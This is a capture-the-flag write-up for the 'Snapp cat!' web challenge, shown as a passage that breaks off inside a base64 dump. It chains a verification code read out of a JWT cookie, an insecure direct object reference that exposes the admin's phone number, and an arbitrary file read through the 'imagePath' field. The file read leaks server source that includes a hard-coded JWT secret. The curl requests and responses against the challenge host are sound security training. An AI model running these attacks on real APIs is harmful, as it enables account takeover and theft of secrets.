# Snapp cat! (medium)

## question

Snapp is going to release a new service called "Snapp cat!". This service lets people to earn with their cat photos.

The first step is sending an image of your cat to our staff. They will review it and will check if the cat in the image is fluffy or cute and then they will upload it to the server using the "Snapp cat! API".

I'm worried that the API might have security holes but our security expert says that he is a dog person and doesn't like to audit the API... So I was wondering if you could help me to figure out if the API is bug-free or not?

Good luck then! Note that our API is still in beta stage and it's not connected to any SMTP server or SMS provider service yet.

READ ME - IMPORTANT

You don't need to do any kind of recon (Fuzzing parameters or paths or subdomains or ports).
All endpoint parameters are listed by swagger. you are not supposed to find any hidden parameter.
There are some bugs in the API and one of them allows you to read the source code.
https://snappcat.spchallenge.ir/

![screen-shot](./assets/snappcat/screen1.png)

## answer

### step1

**find admin cookie**

1. register a new user (`/api/user/register`)
2. login with it (`/api/user/login`)
3. send verification code (`/api/user/send-verification-email`)

after call this api, decode new your cookie:

```
{
  "userId": 167,
  "verificationCode": "8582987038",
  "iat": 1708662563
}
```

4. use `verificationCode` to verify account (`/api/user/email-verification-callbac`)

5. after verify your account, you can see details of any user like admin (with userId 1):

```
GET https://snappcat.spchallenge.ir/api/user/1

{
  "data": {
    "username": "admin",
    "userId": 1,
    "phoneNumber": "+133731333717",
    "isVerified": true
  },
  "success": true
}
```

now you have admin phone number to login with `/api/user/login-with-phone` api and in response you get:
```
{
  "code": {
    "sha256": "f36708b4e2999a4b0e97d9fe42998268d783f9646b0b43ffd765f36188a4d97a"
  },
  "message": "Saved the code in the database but couldn't send the code because the server is not connected to SMS service provider yet",
  "sucess": true
}
```

...

## step2

**create a test cat image**

call `random-cat-image` api:

```
curl --location 'https://snappcat.spchallenge.ir/api/cat/random-cat-image' \
--header 'Cookie: sess=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjEsImlhdCI6MTcwODYzMTk2N30.xbZoNkdioNqHv5jGem77cAdez0m_VNzr8dJHMNYp0uM'
```

in response:

```
{
    "data": {
        "path": "./cats/74a7ff43-2d56-4dab-93a0-b07c9cec0db9.png"
    },
    "success": true
}
```

then call `create` new cat api:

```
curl --location 'https://snappcat.spchallenge.ir/api/cat/create' \
--header 'Content-Type: application/json' \
--header 'Cookie: sess=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjEsImlhdCI6MTcwODYzMTk2N30.xbZoNkdioNqHv5jGem77cAdez0m_VNzr8dJHMNYp0uM' \
--data '{
  "name": "sample",
  "imagePath": "b07c9cec0db9.png",
  "isCute": true,
  "isFluffy": true
}'
```

in response:

```
{
    "data": {
        "catId": "877031eb-99ce-407c-81da-e3bd190d0e88"
    },
    "success": true
}
```

so, now you can view details of cat with id:

```
curl --location 'https://snappcat.spchallenge.ir/api/cat/877031eb-99ce-407c-81da-e3bd190d0e88' \
--header 'Cookie: sess=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjEsImlhdCI6MTcwODYzMTk2N30.xbZoNkdioNqHv5jGem77cAdez0m_VNzr8dJHMNYp0uM'
```

and in response:

```
{
    "message": "Something bad happened while reading the file. Error in /app/index.js: Error: ENOENT: no such file or directory, open 'b07c9cec0db9.png'",
    "success": false
}
```

so, you can realize that if image path be `/app/index.js` maybe you can catch server code!

## step3

**access to index.js**

so, again we try to create a new cat but with `/app/index.js` as `imagePath`:

```
curl --location 'https://snappcat.spchallenge.ir/api/cat/create' \
--header 'Content-Type: application/json' \
--header 'Cookie: sess=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjEsImlhdCI6MTcwODYzMTk2N30.xbZoNkdioNqHv5jGem77cAdez0m_VNzr8dJHMNYp0uM' \
--data '{
  "name": "sample",
  "imagePath": "/app/index.js",
  "isCute": true,
  "isFluffy": true
}'
```

and after create successfully new cat, we try to view cat content:

```
{
    "data": {
        "cat": {
            "isFluffy": true,
            "isCute": true,
            "catId": "24e09488-5c42-4562-b9aa-ca15376fe332",
            "name": "sample",
            "image": "IyEvdXNyL2Jpbi9lbnYgbm9kZQpjb25zdCBleHByZXNzID0gcmVxdWlyZSgnZXhwcmVzcycpCmNvbnN0IHN3YWdnZXJVaSA9IHJlcXVpcmUoJ3N3YWdnZXItdWktZXhwcmVzcycpCmNvbnN0IHN3YWdnZXJKc0RvYyA9IHJlcXVpcmUoJ3N3YWdnZXItanNkb2MnKQpjb25zdCBjb29raWVQYXJzZXIgPSByZXF1aXJlKCdjb29raWUtcGFyc2VyJykKY29uc3QgZnMgPSByZXF1aXJlKCdmcycpCmNvbnN0IGNyeXB0byA9IHJlcXVpcmUoJ2NyeXB0bycpCmNvbnN0IGp3dCA9IHJlcXVpcmUoJ2pzb253ZWJ0b2tlbicpCgpjb25zdCBhcHAgPSBleHByZXNzKCkKY29uc3QgdXNlcnMgPSBuZXcgTWFwKCkKY29uc3QgcGhvbmVtID0gbmV3IFNldCgpCmNvbnN0IGNhdHMgPSBuZXcgTWFwKCkKY29uc3Qgc2hhMjU2ID0gZGF0YSA9PiBjcnlwdG8uY3JlYXRlSGFzaCgnc2hhMjU2JykudXBkYXRlKGRhdGEpLmRpZ2VzdCgiaGV4IikKY29uc3Qgand0U2VjcmV0ID0gJ29taWR2YXJhbS10by1rZS1pbm8tbWliaW5pLWRldmVsb3Blci13ZWJzaXRlLWJhc2hpLWZkMjkyOTNjZGVhZjcwZGM2N2I0MjBlNzNhMzdlMTcyJwpjb25zdCByZWdpc3RlcmVkVXNlcm5hbWVzID0gbmV3IFNldCgpCmNvbnN0IHJlZ2lzdGVyZWRQaG9uZU51bWJlcnMgPSBuZXcgU2V0KCkKY29uc3QgY2F0SW1hZ2VzID0gWycuL2NhdHMvM2EzMzhkYTYtOWIwZi00YzFhLWJjMzUtZjcwMGNjNGI5MTVlLnBuZycsJy4vY2F0cy9kZmQ5OTY3Zi0yMTZiLTRiYjYtYWZmYy00YzY4NzA4OTY0YWMucG5nJywnLi9jYXRzLzc0YTdmZjQzLTJkNTYtNGRhYi05M2EwLWIwN2M5Y2VjMGRiOS5wbmcnXQpsZXQgZmxhZyA9IGZzLnJlYWRGaWxlU3luYygnL2ZsYWcudHh0JykKbGV0IHVpZGNudCA9IDIKCmNvbnN0IHN3YWdnZXJPcHRpb25zID0gewogIGRlZmluaXRpb246IHsKICAgIG9wZW5hcGk6ICczLjAuMCcsCiAgICBpbmZvOiB7CiAgICAgIHRpdGxlOiAnU25hcHAtY2F0IEFQSScsCiAgICAgIHZlcnNpb246ICcxLjAuMCcsCiAgICAgIGRlc2NyaXB0aW9uOiAnQVBJIERvY3VtZW50YXRpb24nLAogICAgfQogIH0sCiAgYXBpczogWycuL2luZGV4LmpzJ10sCn0KCmNvbnN0IHN3YWdnZXJEb2NzID0gc3dhZ2dlckpzRG9jKHN3YWdnZXJPcHRpb25zKQphcHAudXNlKGV4cHJlc3MuanNvbigpKQphcHAudXNlKGNvb2tpZVBhcnNlcigpKQphcHAudXNlKCcvc3dhZ2dlci11aScsKHJlcSxyZXMsbmV4dCk9PnsKCXJlcy5zZXRIZWFkZXIoIkNhY2hlLUNvbnRyb2wiLCJtYXgtYWdlPTYwIik7CgluZXh0KCk7Cn0pCmFwcC51c2UoJy9zd2FnZ2VyLXVpJywgc3dhZ2dlclVpLnNlcnZlLCBzd2FnZ2VyVWkuc2V0dXAoc3dhZ2dlckRvY3MpKQphcHAuZ2V0KCcvJywocmVxLHJlcyk9PnJlcy5yZWRpcmVjdCgnL3N3YWdnZXItdWknKSkKCi8qKgogKiBAc3dhZ2dlcgogKiAvYXBpL3VzZXIvcmVnaXN0ZXI6CiAqICBwb3N0OgogKiAgICBkZXNjcmlwdGlvbjogUmVnaXN0ZXJzIGEgbmV3IHVzZXIuCiAqICAgIHRhZ3M6CiAqICAgICAgLSB1c2VycwogKiAgICBwcm9kdWNlczoKICogICAgICAtIGFwcGxpY2F0aW9uL2pzb24KICogICAgY29uc3VtZXM6CiAqICAgICAgLSBhcHBsaWNhdGlvbi9qc29uCiAqICAgIHJlcXVlc3RCb2R5OgogKiAgICAgIHJlcXVpcmVkOiB0cnVlCiAqICAgICAgY29udGVudDoKICogICAgICAgIGFwcGxpY2F0aW9uL2pzb246CiAqICAgICAgICAgIHNjaGVtYToKICogICAgICAgICAgICB0eXBlOiBvYmplY3QKICogICAgICAgICAgICBwcm9wZXJ0aWVzOgogKiAgICAgICAgICAgICAgdXNlcm5hbWU6CiAqICAgICAgICAgICAgICAgIHR5cGU6IHN0cmluZwogKiAgICAgICAgICAgICAgcGFzc3dvcmQ6CiAqICAgICAgICAgICAgICAgIHR5cGU6IHN0cmluZwogKiAgICAgICAgICAgICAgcGhvbmVOdW1iZXI6CiAqICAgICAgICAgICAgICAgIHR5cGU6IHN0cmluZwogKiAgICAgICAgICAgICAgZW1haWw6CiAqICAgICAgICAgICAgICAgIHR5cGU6IHN0cmluZwogKiAgICByZXNwb25zZXM6CiAqICAgICAgMjAwOgogKiAgICAgICAgZGVzY3JpcHRpb246IFN1Y2Nlc3NmdWxseSByZWdpc3RlcmVkIHRoZSB1c2VyCiAqICAgICAgNDAwOgogKiAgICAgICAgZGVzY3JpcHRpb246IEJhZCBwYXJhbWV0ZXJzIAogKi8KYXBwLnBvc3QoJy9hcGkvdXNlci9yZWdpc3RlcicsKHJlcSxyZXMpPT57CiAgbGV0IHVzZXJuYW1lID0gcmVxLmJvZHkudXNlcm5hbWUKICBsZXQgcGFzc3dvcmQgPSByZXEuYm9keS5wYXNzd29yZAogIGxldCBwaG9uZU51bWJlciA9IHJlcS5ib2R5LnBob25lTnVtYmVyCiAgbGV0IGVtYWlsID0gcmVxLmJvZHkuZW1haWwKCiAgaWYodHlwZW9mIHVzZXJuYW1lICE9ICdzdHJpbmcnIHx8IHR5cGVvZiBwYXNzd29yZCAhPSAnc3RyaW5nJyB8fCB0eXBlb2YgcGhvbmVOdW1iZXIgIT0gJ3N0cmluZycgfHwgdHlwZW9mIGVtYWlsICE9ICdzdHJpbmcnKXsKICAgIHJldHVybiByZXMuc3RhdHVzKDQwMCkuanNvbih7bWVzc2FnZTogJ0JhZCBwYXJhbWV0ZXJzJywgc3VjY2VzczogZmFsc2V9KQogIH0KCiAgaWYoIS9eW2EtejAtOV17NiwyMH0kLy50ZXN0KHVzZXJuYW1lKSl7CiAgICByZXR1cm4gcmVzLnN0YXR1cyg0MDApLmpzb24oe21lc3NhZ2U6ICdVc2VybmFtZSBzaG91bGQgbWF0Y2ggL15bYS16MC05XXs2LDIwfSQvJywgc3VjY2VzczogZmFsc2V9KQogIH0KCiAgaWYoIS9eW1x4MjAtXHg3Zl17OCw2NH0kLy50ZXN0KHBhc3N3b3JkKSl7CiAgICByZXR1cm4gcmVzLnN0YXR1cyg0MDApLmpzb24oe21lc3NhZ2U6ICdQYXNzd29yZCBzaG91bGQgbWF0Y2ggL15bXFx4MjAtXFx4N2ZdezgsNjR9JC8nLCBzdWNjZXNzOiBmYWxzZX0pCiAgfQoKICBpZighL15cK1swLTldezEyfSQvLnRlc3QocGhvbmVOdW1iZXIpKXsKICAgIHJldHVybiByZXMuc3RhdHVzKDQwMCkuanNvbih7bWVzc2FnZTogJ1Bob25lIG51bWJlciBzaG91bGQgbWF0Y2ggL15cXCtbMC05XXsxMn0kLycsIHN1Y2Nlc3M6IGZhbHNlfSkKICB9CgogIGlmKCEvXltcdy1dK0BbXHctXStcLlx3KyQvLnRlc3QoZW1haWwpKXsKICAgIHJldHVybiByZXMuc3RhdHVzKDQwMCkuanNvbih7bWVzc2FnZTogJ0VtYWlsIHNob3VsZCBtYXRjaCAvXltcXHctXStAW1xcdy1dK1xcLlxcdyskLycsIHN1Y2Nlc3M6IGZhbHNlfSkKICB9CgogIGlmKHJlZ2lzdGVyZWRVc2VybmFtZXMuaGFzKHVzZXJuYW1lKSl7CiAgICByZXR1cm4gcmVzLnN0YXR1cyg0MDApLmpzb24oe21lc3NhZ2U6ICdBIHVzZXIgd2l0aCB0aGlzIHVzZXJuYW1lIGFscmVhZHkgZXhpc3RzJywgc3VjY2VzczogZmFsc2V9KQogIH0KCiAgaWYocmVnaXN0ZXJlZFBob25lTnVtYmVycy5oYXMocGhvbmVOdW1iZXIpKXsKICAgIHJldHVybiByZXMuc3RhdHVzKDQwMCkuanNvbih7bWVzc2FnZTogJ0EgdXNlciB3aXRoIHRoaXMgcGhvbmUgbnVtYmVyIGFscmVhZHkgZXhpc3RzJywgc3VjY2VzczogZmFsc2V9KQogIH0KCiAgcGFzc3dvcmQgPSBzaGEyNTYocGFzc3dvcmQpCiAgcmVnaXN0ZXJlZFVzZXJuYW1lcy5hZGQodXNlcm5hbWUpCiAgcmVnaXN0ZXJlZFBob25lTnVtYmVycy5hZGQocGhvbmVOdW1iZXIpCgogIHVzZXJzLnNldCh1aWRjbnQsewogICAgdXNlcklkOiB1aWRjbnQsCiAgICB1c2VybmFtZSwKICAgIHBhc3N3b3JkLAogICAgcGhvbmVOdW1iZXIsCiAgICBpc1ZlcmlmaWVkOiBmYWxzZQogIH0pCiAgdWlkY250ICs9IDEKCiAgcmVzLmpzb24oe3N1Y2Nlc3M6IHRydWV9KQp9KQoKLyoqCiAqIEBzd2FnZ2VyCiAqIC9hcGkvdXNlci9sb2dpbjoKICogIHBvc3Q6CiAqICAgIGRlc2NyaXB0aW9uOiBDaGVja3MgdXNlcm5hbWUgYW5kIHBhc3N3b3JkIGFuZCBzZXRzIHRoZSBzZXNzaW9uIGNvb2tpZS4gCiAqICAgIHRhZ3M6CiAqICAgICAgLSB1c2VycwogKiAgICBwcm9kdWNlczoKICogICAgICAtIGFwcGxpY2F0aW9uL2pzb24KICogICAgY29uc3VtZXM6CiAqICAgICAgLSBhcHBsaWNhdGlvbi9qc29uCiAqICAgIHJlcXVlc3RCb2R5OgogKiAgICAgIHJlcXVpcmVkOiB0cnVlCiAqICAgICAgY29udGVudDoKICogICAgICAgIGFwcGxpY2F0aW9uL2pzb246CiAqICAgICAgICAgIHNjaGVtYToKICogICAgICAgICAgICB0eXBlOiBvYmplY3QKICogICAgICAgICAgICBwcm9wZXJ0aWVzOgogKiAgICAgICAgICAgICAgdXNlcm5hbWU6CiAqICAgICAgICAgICAgICAgIHR5cGU6IHN0cmluZwogKiAgICAgICAgICAgICAgcGFzc3dvcmQ6CiAqICAgICAgICAgICAgICAgIHR5cGU6IHN0cmluZwogKiAgICByZXNwb25zZXM6CiAqICAgICAgMjAwOgogKiAgICAgICAgZGVzY3JpcHRpb246IFN1Y2Nlc3NmdWwgbG9naW4KICogICAgICA0MDA6CiAqICAgICAgICBkZXNjcmlwdGlvbjogQmFkIHBhcmFtZXRlcnMKICogICAgICA0MDE6CiAqICAgICAgICBkZXNjcmlwdGlvbjogSW5jb3JyZWN0IHVzZXJuYW1lIG9yIHBhc3N3b3JkCiAqLwphcHAucG9zdCgnL2FwaS91c2VyL2xvZ2luJywocmVxLHJlcyk9PnsKICBsZXQgdXNlcm5hbWUgPSByZXEuYm9keS51c2VybmFtZQogIGxldCBwYXNzd29yZCA9IHJlcS5ib2R5LnBhc3N3b3JkCgogIGlmKHR5cGVvZiB1c2VybmFtZSAhPSAnc3RyaW5nJyB8fCB0eXBlb2YgcGFzc3dvcmQgIT0gJ3N0cmluZycpewogICAgcmV0dXJuIHJlcy5zdGF0dXMoNDAwKS5qc29uKHttZXNzYWdlOiAnQmFkIHBhcmFtZXRlcnMnLCBzdWNjZXNzOiBmYWxzZX0pCiAgfQoKICBwYXNzd29yZCA9IHNoYTI1NihwYXNzd29yZCkKCiAgbGV0IHVzZXJJZCA9IG51bGwKICBmb3IobGV0IGUgb2YgdXNlcnMpewogICAgaWYoZVsxXS51c2VybmFtZSA9PT0gdXNlcm5hbWUgJiYgZVsxXS5wYXNzd29yZCA9PT0gcGFzc3dvcmQpewogICAgICB1c2VySWQgPSBlWzFdLnVzZXJJZAogICAgICBicmVhawogICAgfQogIH0KCiAgaWYodXNlcklkID09PSBudWxsKXsKICAgIHJldHVybiByZXMuc3RhdHVzKDQwMSkuanNvbih7bWVzc2FnZTogJ0luY29ycmVjdCB1c2VybmFtZSBvciBwYXNzd29yZCcsIHN1Y2Nlc3M6IGZhbHNlfSkKICB9CgogIGxldCB0b2tlbiA9IGp3dC5zaWduKHsKICAgIHVzZXJJZAogIH0sand0U2VjcmV0KQogIHJlcy5jb29raWUoJ3Nlc3MnLCB0b2tlbiwge21heEFnZTogMTAwMCo2MCo2MCwgaHR0cE9ubHk6IHRydWV9KQoKICByZXMuanNvbih7c3VjY2VzczogdHJ1ZX0pCn0pCgpjb25zdCBhdXRoQ2hlY2sgPSAocmVxLHJlcyxuZXh0KSA9PiB7CiAgbGV0IHRva2VuID0gcmVxLmNvb2tpZXMuc2VzcwogIGlmKHR5cGVvZiB0b2tlbiA9PSAnc3RyaW5nJyl7CiAgICB0cnl7CiAgICAgIHJlcS5zZXNzID0gand0LnZlcmlmeSh0b2tlbixqd3RTZWNyZXQpCiAgICAgIHJlcS51c2VyID0gdXNlcnMuZ2V0KHJlcS5zZXNzLnVzZXJJZCkKICAgICAgaWYocmVxLnVzZXIpewogICAgICAgIC8vIHdpbGwgdW5jb21tZW50IHRoaXMgd2hlbiBpbiBwcm9kdWN0aW9uCiAgICAgICAgLy8gaWYocmVxLnVzZXIudXNlcklkID09IDEpewogICAgICAgIC8vICAgcmVxLnNlc3MuY2FuUmVhZFNlY3JldHMgPSB0cnVlCiAgICAgICAgLy8gfQogICAgICAgIHJldHVybiBuZXh0KCkKICAgICAgfQogICAgfSBjYXRjaChlKXsgY29uc29sZS5sb2coZSkgfQogIH0KICByZXR1cm4gcmVzLmpzb24oe21lc3NhZ2U6ICdVbmF1dGhlbnRpY2F0ZWQnLCBzdWNjZXNzOiBmYWxzZX0pCn0KCi8qKgogKiBAc3dhZ2dlcgogKiAvYXBpL3VzZXIvbG9naW4td2l0aC1waG9uZToKICogIHBvc3Q6CiAqICAgIGRlc2NyaXB0aW9uOiBzZW5kcyBhIDctZGlnaXQgY29kZSB0byB0aGUgcGhvbmVOdW1iZXIgb2YgdXNlci4gb3VyIHNlcnZlciBpcyBub3QgY29ubmVjdGVkIHRvIFNNUyBzZXJ2aWNlIHByb3ZpZGVyIHlldCBzbyB1c2VyIHdvbid0IHJlY2VpdmUgYW55dGhpbmcuCiAqICAgIHRhZ3M6CiAqICAgICAgLSB1c2VycwogKiAgICBwcm9kdWNlczoKICogICAgICAtIGFwcGxpY2F0aW9uL2pzb24KICogICAgY29uc3VtZXM6CiAqICAgICAgLSBhcHBsaWNhdGlvbi9qc29uCiAqICAgIHJlcXVlc3RCb2R5OgogKiAgICAgIHJlcXVpcmVkOiB0cnVlCiAqICAgICAgY29udGVudDoKICogICAgICAgIGFwcGxpY2F0aW9uL2pzb246CiAqICAgICAgICAgIHNjaGVtYToKICogICAgICAgICAgICB0eXBlOiBvYmplY3QKICogICAgICAgICAgICBwcm9wZXJ0aWVzOgogKiAgICAgICAgICAgICAgcGhvbmVOdW1iZXI6CiAqICAgICAgICAgICAgICAgIHR5cGU6IHN0cmluZwogKiAgICByZXNwb25zZXM6CiAqICAgICAgMjAwOgogKiAgICAgICAgZGVzY3JpcHRpb246IFN1Y2Nlc3NmdWwgcmVzcG9uc2UKICogICAgICA0MDA6CiAqICAgICAgICBkZXNjcmlwdGlvbjogQmFkIHBhcmFtZXRlcnMKICogICAgICA0MDM6CiAqICAgICAgICBkZXNjcmlwdGlvbjogVW5hdXRoZW50aWNhdGVkCiAqICAgICAgNDA0OgogKiAgICAgICAgZGVzY3JpcHRpb246IENvdWxkbid0IGZpbmQgYSB1c2VyIHdpdGggdGhpcyBwaG9uZSBudW1iZXIKICovCmFwcC5wb3N0KCcvYXBpL3VzZXIvbG9naW4td2l0aC1waG9uZScsKHJlcSxyZXMpPT57CiAgbGV0IHBob25lTnVtYmVyID0gcmVxLmJvZHkucGhvbmVOdW1iZXIKICBsZXQgY29kZSA9IE1hdGgucmFuZG9tKCkudG9TdHJpbmcoKS5zbGljZSgtNykKCiAgaWYodHlwZW9mIHBob25lTnVtYmVyICE9ICdzdHJpbmcnIHx8ICEvXlwrWzAtOV17MTJ9JC8udGVzdChwaG9uZU51bWJlcikpewogICAgcmV0dXJuIHJlcy5zdGF0dXMoNDAwKS5qc29uKHttZXNzYWdlOiAnUGhvbmUgbnVtYmVyIHNob3VsZCBtYXRjaCAvXlxcK1swLTldezEyfSQvJywgc3VjY2VzczogZmFsc2V9KQogIH0KCiAgbGV0IHVzZXJJZCA9IG51bGwKICBmb3IobGV0IGUgb2YgdXNlcnMpewogICAgaWYoZVsxXS5waG9uZU51bWJlciA9PT0gcGhvbmVOdW1iZXIpewogICAgICB1c2VySWQgPSBlWzFdLnVzZXJJZAogICAgICBicmVhawogICAgfQogIH0KCiAgaWYodXNlcklkID09IG51bGwpewogICAgcmV0dXJuIHJlcy5zdGF0dXMoNDA0KS5qc29uKHttZXNzYWdlOiAnQ291bGRuXCd0IGZpbmQgYSB1c2VyIHdpdGggdGhpcyBwaG9uZSBudW1iZXInLCBzdWNjZXNzOiBmYWxzZX0pCiAgfQoKICBwaG9uZW0uYWRkKHsKICAgIHBob25lTnVtYmVyLAogICAgdXNlcklkLAogICAgY29kZQogIH0pCgogIHJlcy5qc29uKHtjb2RlOiB7c2hhMjU2OiBzaGEyNTYoY29kZSl9LCBtZXNzYWdlOiAnU2F2ZWQgdGhlIGNvZGUgaW4gdGhlIGRhdGFiYXNlIGJ1dCBjb3VsZG5cJ3Qgc2VuZCB0aGUgY29kZSBiZWNhdXNlIHRoZSBzZXJ2ZXIgaXMgbm90IGNvbm5lY3RlZCB0byBTTVMgc2VydmljZSBwcm92aWRlciB5ZXQnLHN1Y2VzczogdHJ1ZX0pCn0pCgovKioKICogQHN3YWdnZXIKICogL2FwaS91c2VyL2xvZ2luLXdpdGgtcGhvbmUtY2FsbGJhY2s6CiAqICBwb3N0OgogKiAgICBkZXNjcmlwdGlvbjogY2hlY2tzIHRoZSA3LWRpZ2l0IGNvZGUgdGhhdCB3YXMgc2VudCB0byB0aGUgdXNlciB2aWEgL2FwaS91c2VyL2xvZ2luLXdpdGgtcGhvbmUgYW5kIHNldHMgdGhlIHNlc3Npb24gY29va2llCiAqICAgIHRhZ3M6CiAqICAgICAgLSB1c2VycwogKiAgICBwcm9kdWNlczoKICogICAgICAtIGFwcGxpY2F0aW9uL2pzb24KICogICAgY29uc3VtZXM6CiAqICAgICAgLSBhcHBsaWNhdGlvbi9qc29uCiAqICAgIHJlcXVlc3RCb2R5OgogKiAgICAgIHJlcXVpcmVkOiB0cnVlCiAqICAgICAgY29udGVudDoKICogICAgICAgIGFwcGxpY2F0aW9uL2pzb246CiAqICAgICAgICAgIHNjaGVtYToKICogICAgICAgICAgICB0eXBlOiBvYmplY3QKICogICAgICAgICAgICBwcm9wZXJ0aWVzOgogKiAgICAgICAgICAgICAgcGhvbmVOdW1iZXI6CiAqICAgICAgICAgICAgICAgIHR5cGU6IHN0cmluZwogKiAgICAgICAgICAgICAgY29kZToKICogICAgICAgICAgICAgICAgdHlwZTogc3RyaW5nCiAqICAgIHJlc3BvbnNlczoKICogICAgICAyMDA6CiAqICAgICAgICBkZXNjcmlwdGlvbjogU3VjY2Vzc2Z1bCByZXNwb25zZQogKiAgICAgIDQwMDoKICogICAgICAgIGRlc2NyaXB0aW9uOiBCYWQgcGFyYW1ldGVycwogKiAgICAgIDQwMzoKICogICAgICAgIGRlc2NyaXB0aW9uOiBVbmF1dGhlbnRpY2F0ZWQKICogICAgICA0MDE6CiAqICAgICAgICBkZXNjcmlwdGlvbjogUGhvbmUgbnVtYmVyIG9yIGNvZGUgaXMgaW5jb3JyZWN0CiAqLwphcHAucG9zdCgnL2FwaS91c2VyL2xvZ2luLXdpdGgtcGhvbmUtY2FsbGJhY2snLChyZXEscmVzKT0+ewogIGxldCBwaG9uZU51bWJlciA9IHJlcS5ib2R5LnBob25lTnVtYmVyCiAgbGV0IGNvZGUgPSByZXEuYm9keS5jb2RlCgogIGlmKHR5cGVvZiBwaG9uZU51bWJlciAhPSAnc3RyaW5nJyB8fCAhL15cK1swLTldezEyfSQvLnRlc3QocGhvbmVOdW1iZXIpKXsKICAgIHJldHVybiByZXMuc3RhdHVzKDQwMCkuanNvbih7bWVzc2FnZTogJ1Bob25lIG51bWJlciBzaG91bGQgbWF0Y2ggL15cXCtbMC05XXsxMn0kLycsIHN1Y2Nlc3M6IGZhbHNlfSkKICB9CgogIGlmKCEvXlswLTldezd9JC8udGVzdChjb2RlKSl7CiAgICByZXR1cm4gcmVzLnN0YXR1cyg0MDApLmpzb24oe21lc3NhZ2U6ICdQaG9uZSBudW1iZXIgc2hvdWxkIG1hdGNoIC9eXFwrWzAtOV17MTJ9JC8nLCBzdWNjZXNzOiBmYWxzZX0pCiAgfQoKICBjb2RlID0gY29kZS50b1N0cmluZygpCiAgcGhvbmVOdW1iZXIgPSBwaG9uZU51bWJlci50b1N0cmluZygpCgogIGxldCB1c2VySWQgPSBudWxsCiAgZm9yKGxldCBwIG9mIHBob25lbSl7CiAgICBpZihwLnBob25lTnVtYmVyID09PSBwaG9uZU51bWJlciAmJiBwLmNvZGUgPT0gY29kZSl7CiAgICAgIHVzZXJJZCA9IHAudXNlcklkCiAgICAgIGRlbGV0ZSBwLnBob25lTnVtYmVyCiAgICAgIGJyZWFrCiAgICB9CiAgfQoKICBpZih1c2VySWQgPT09IG51bGwpewogICAgcmV0dXJuIHJlcy5zdGF0dXMoNDAxKS5qc29uKHttZXNzYWdlOiAnUGhvbmUgbnVtYmVyIG9yIGNvZGUgaXMgaW5jb3JyZWN0Jywgc3VjY2VzczogZmFsc2V9KQogIH0KICBsZXQgdG9rZW4gPSBqd3Quc2lnbih7CiAgICB1c2VySWQKICB9LGp3dFNlY3JldCkKICByZXMuY29va2llKCdzZXNzJywgdG9rZW4sIHttYXhBZ2U6IDEwMDAqNjAqNjAsIGh0dHBPbmx5OiB0cnVlfSkKCiAgcmVzLmpzb24oe3N1Y2VzczogdHJ1ZX0pCn0pCgovKioKICogQHN3YWdnZXIKICogL2FwaS91c2VyL3NlbGYtaWQ6CiAqICBnZXQ6CiAqICAgIGRlc2NyaXB0aW9uOiBSZXR1cm5zIHVzZXIgaWQgb2YgdGhlIGxvZ2dlZCBpbiB1c2VyLiAKICogICAgdGFnczoKICogICAgICAtIHVzZXJzCiAqICAgIHByb2R1Y2VzOgogKiAgICAgIC0gYXBwbGljYXRpb24vanNvbgogKiAgICByZXNwb25zZXM6CiAqICAgICAgMjAwOgogKiAgICAgICAgZGVzY3JpcHRpb246IFN1Y2Nlc3NmdWwgcmVzcG9uc2UKICogICAgICA0MDM6CiAqICAgICAgICBkZXNjcmlwdGlvbjogVW5hdXRoZW50aWNhdGVkCiAqLwphcHAuZ2V0KCcvYXBpL3VzZXIvc2VsZi1pZCcsYXV0aENoZWNrLChyZXEscmVzKT0+ewogIHJlcy5qc29uKHtkYXRhOiB7CiAgICB1c2VySWQ6IHJlcS51c2VyLnVzZXJJZCwKICB9LCBzdWNjZXNzOiB0cnVlfSkKfSkKCi8qKgogKiBAc3dhZ2dlcgogKiAvYXBpL3VzZXIvc2VuZC12ZXJpZmljYXRpb24tZW1haWw6CiAqICBwb3N0OgogKiAgICBkZXNjcmlwdGlvbjogU2VuZHMgYW4gZW1haWwgdG8gdGhlIHVzZXIgY29udGFpbmluZyBhIDEwLWRpZ2l0IGNvZGUuIFNpbmNlIHdlIGFyZSBpbiBiZXRhIHN0YWdlLCB0aGlzIGVuZHBvaW50IGlzIG5vdCB5ZXQgY29ubmVjdGVkIHRvIGFueSBTTVRQIHNlcnZlciBzbyBjdXJyZW50bHkgd2UgY2FuJ3Qgc2VuZCBlbWFpbHMuCiAqICAgIHRhZ3M6CiAqICAgICAgLSB1c2VycwogKiAgICBwcm9kdWNlczoKICogICAgICAtIGFwcGxpY2F0aW9uL2pzb24KICogICAgcmVzcG9uc2VzOgogKiAgICAgIDIwMDoKICogICAgICAgIGRlc2NyaXB0aW9uOiBTdWNjZXNzZnVsIHJlc3BvbnNlCiAqICAgICAgNDAzOgogKiAgICAgICAgZGVzY3JpcHRpb246IFVuYXV0aGVudGljYXRlZAogKi8KYXBwLnBvc3QoJy9hcGkvdXNlci9zZW5kLXZlcmlmaWNhdGlvbi1lbWFpbCcsYXV0aENoZWNrLChyZXEscmVzKT0+ewogIGxldCB0b2tlbiA9IGp3dC5zaWduKHsKICAgIHVzZXJJZDogcmVxLnVzZXIudXNlcklkLAogICAgdmVyaWZpY2F0aW9uQ29kZTogTWF0aC5yYW5kb20oKS50b1N0cmluZygpLnNsaWNlKC0xMCkKICB9LGp3dFNlY3JldCkKICByZXMuY29va2llKCdzZXNzJywgdG9rZW4sIHttYXhBZ2U6IDEwMDAqNjAqNjAsIGh0dHBPbmx5OiB0cnVlfSkKCiAgcmVzLmpzb24oe21lc3NhZ2U6ICdHZW5lcmF0ZWQgYW5kIHNhdmVkIHRoZSBjb2RlIGluIHNlc3Npb24gYnV0IGNvdWxkXCdudCBzZW5kIHRoZSBlbWFpbCBiZWNhdXNlIGVtYWlsIHByb2Nlc3NpbmcgaXMgZGlzYWJsZWQnLCBzdWNjZXNzOiB0cnVlfSkKfSkKCi8qKgogKiBAc3dhZ2dlcgogKiAvYXBpL3VzZXIvZW1haWwtdmVyaWZpY2F0aW9uLWNhbGxiYWNrOgogKiAgZ2V0OgogKiAgICBkZXNjcmlwdGlvbjogRW1haWwgdmVyaWZpY2F0aW9uIGNhbGxiYWNrLgogKiAgICB0YWdzOgogKiAgICAgIC0gdXNlcnMKICogICAgcHJvZHVjZXM6CiAqICAgICAgLSBhc